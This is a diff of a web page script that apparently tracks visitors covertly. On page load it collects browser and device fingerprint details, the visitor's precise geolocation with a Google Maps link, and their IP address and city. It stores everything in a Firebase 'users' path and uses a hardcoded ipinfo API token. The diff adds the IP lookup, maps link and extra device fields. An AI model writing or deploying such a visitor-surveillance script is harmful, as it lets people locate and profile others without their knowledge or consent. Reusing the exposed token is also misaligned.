@@ -64,62 +64,83 @@
 
     // Function to write data to Firebase Realtime Database
     function writeDataToFirebase(data) {
-    // Create a valid timestamp for the path
-    const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Replace colons and periods with dashes
-    const sanitizedTimestamp = timestamp.replace(/[^a-zA-Z0-9_-]/g, ''); // Remove any remaining invalid characters
+        // Create a valid timestamp for the path
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Replace colons and periods with dashes
+        const sanitizedTimestamp = timestamp.replace(/[^a-zA-Z0-9_-]/g, ''); // Remove any remaining invalid characters
 
-    set(ref(database, 'users/' + sanitizedTimestamp), data)
-        .then(() => {
-            console.log("Data successfully written to Firebase");
-        })
-        .catch((error) => {
-            console.error("Error writing data to Firebase: ", error);
-        });
-}
-
+        set(ref(database, 'users/' + sanitizedTimestamp), data)
+            .then(() => {
+                console.log("Data successfully written to Firebase");
+            })
+            .catch((error) => {
+                console.error("Error writing data to Firebase: ", error);
+            });
+    }
 
     async function collectData() {
         // Collect browser and device information
         const browserDetails = `Browser: ${navigator.userAgent}`;
         const operatingSystem = `Operating System: ${navigator.platform}`;
+        const osVersion = navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android \d+|iPhone OS \d+|iPad OS \d+)/) ? 
+            navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android \d+|iPhone OS \d+|iPad OS \d+)/)[0] : 'Unknown OS Version';
         const screenResolution = `Screen Resolution: ${screen.width} x ${screen.height}`;
         const colorDepth = `Color Depth: ${screen.colorDepth}-bit`;
         const deviceMemory = navigator.deviceMemory ? `Device Memory: ${navigator.deviceMemory} GB` : 'Device Memory: Not Available';
         const logicalProcessors = `Logical Processors: ${navigator.hardwareConcurrency}`;
+        const deviceModel = navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"; // Basic check for device model
 
         // Collect network details if available
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         const networkType = connection ? `Network Type: ${connection.effectiveType}` : 'Network Type: Not Available';
         const downlinkSpeed = connection ? `Downlink Speed: ${connection.downlink} Mbps` : 'Downlink Speed: Not Available';
-
-        const collectedData = {
+	
+	    const collectedData = {
             browserDetails,
             operatingSystem,
+            osVersion,
             screenResolution,
             colorDepth,
             deviceMemory,
             logicalProcessors,
             networkType,
-            downlinkSpeed
+            downlinkSpeed,
+            deviceModel // Include device model
         };
 
         // Geolocation
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
+                async (position) => {
                     collectedData.latitude = position.coords.latitude;
                     collectedData.longitude = position.coords.longitude;
+
+                    // Create Google Maps link
+                    collectedData.mapsLink = `https://www.google.com/maps?q=${collectedData.latitude},${collectedData.longitude}`;
+
+                    // Get IP address and location
+                    await getIPInfo(collectedData);
+                    
                     writeDataToFirebase(collectedData); // Send data to Firebase
                 },
-                () => {
-                    // If user denies location, send the rest of the data
+                async () => {
+                    // If user denies location, get IP info and send the rest of the data
+                    await getIPInfo(collectedData);
                     writeDataToFirebase(collectedData);
                 }
             );
         } else {
             // If geolocation is not supported
+            await getIPInfo(collectedData);
             writeDataToFirebase(collectedData);
         }
+    }
+
+    async function getIPInfo(data) {
+        const ipResponse = await fetch(`https://ipinfo.io?token=78c7d0f519bee6`);
+        const ipData = await ipResponse.json();
+        
+        data.ipAddress = ipData.ip;
+        data.ipLocation = ipData.city + ', ' + ipData.region + ', ' + ipData.country; // Format IP location
     }
 
     window.onload = collectData; // Run the data collection when the page loads
